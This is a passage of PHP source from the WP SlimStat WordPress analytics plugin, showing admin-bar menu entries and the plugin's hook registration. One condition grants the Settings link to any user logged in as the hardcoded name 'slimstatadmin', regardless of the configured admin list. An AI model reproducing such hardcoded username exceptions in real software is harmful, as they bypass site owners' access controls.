			$GLOBALS['wp_admin_bar']->add_menu(array('id' => 'slimstat-panel2', 'href' => "{$slimstat_view_url}wp-slim-view-2", 'parent' => 'slimstat-header', 'title' => __('Overview', 'wp-slimstat')));
			$GLOBALS['wp_admin_bar']->add_menu(array('id' => 'slimstat-panel3', 'href' => "{$slimstat_view_url}wp-slim-view-3", 'parent' => 'slimstat-header', 'title' => __('Audience', 'wp-slimstat')));
			$GLOBALS['wp_admin_bar']->add_menu(array('id' => 'slimstat-panel4', 'href' => "{$slimstat_view_url}wp-slim-view-4", 'parent' => 'slimstat-header', 'title' => __('Site Analysis', 'wp-slimstat')));
			$GLOBALS['wp_admin_bar']->add_menu(array('id' => 'slimstat-panel5', 'href' => "{$slimstat_view_url}wp-slim-view-5", 'parent' => 'slimstat-header', 'title' => __('Traffic Sources', 'wp-slimstat')));
			$GLOBALS['wp_admin_bar']->add_menu(array('id' => 'slimstat-panel6', 'href' => "{$slimstat_view_url}wp-slim-view-6", 'parent' => 'slimstat-header', 'title' => __('Map Overlay', 'wp-slimstat')));
			if (has_action('wp_slimstat_custom_report')) $GLOBALS['wp_admin_bar']->add_menu(array('id' => 'slimstat-panel7', 'href' => "{$slimstat_view_url}wp-slim-view-7", 'parent' => 'slimstat-header', 'title' => __('Custom Reports', 'wp-slimstat')));
			$GLOBALS['wp_admin_bar']->add_menu(array('id' => 'slimstat-panel8', 'href' => "{$slimstat_view_url}wp-slim-addons", 'parent' => 'slimstat-header', 'title' => __('Add-ons', 'wp-slimstat')));
			
			if ((empty(wp_slimstat::$options['can_admin']) || strpos(wp_slimstat::$options['can_admin'], $GLOBALS['current_user']->user_login) !== false || $GLOBALS['current_user']->user_login == 'slimstatadmin') && current_user_can('edit_posts')){
				$GLOBALS['wp_admin_bar']->add_menu(array('id' => 'slimstat-config', 'href' => $slimstat_config_url, 'parent' => 'slimstat-header', 'title' => __('Settings', 'wp-slimstat')));
			}
		}
	}
	// end wp_slimstat_adminbar
}
// end of class declaration

// Ok, let's go, Sparky!
if (function_exists('add_action')){
	// Init the Ajax listener
	if (!empty($_POST['action']) && $_POST['action'] == 'slimtrack'){
		add_action('wp_ajax_nopriv_slimtrack', array('wp_slimstat', 'slimtrack_ajax'));
		add_action('wp_ajax_slimtrack', array('wp_slimstat', 'slimtrack_ajax')); 
	}

	// Load the admin API, if needed
	// From the codex: You can't call register_activation_hook() inside a function hooked to the 'plugins_loaded' or 'init' hooks (or any other hook). These hooks are called before the plugin is loaded or activated.
	if (is_admin()){
		include_once(dirname(__FILE__).'/admin/wp-slimstat-admin.php');
		add_action('plugins_loaded', array('wp_slimstat_admin', 'init'), 15);
		register_activation_hook(__FILE__, array('wp_slimstat_admin', 'init_environment'));
		register_deactivation_hook(__FILE__, array('wp_slimstat_admin', 'deactivate'));
	}

	// Add the appropriate actions
	add_action('plugins_loaded', array('wp_slimstat', 'init'), 10);
}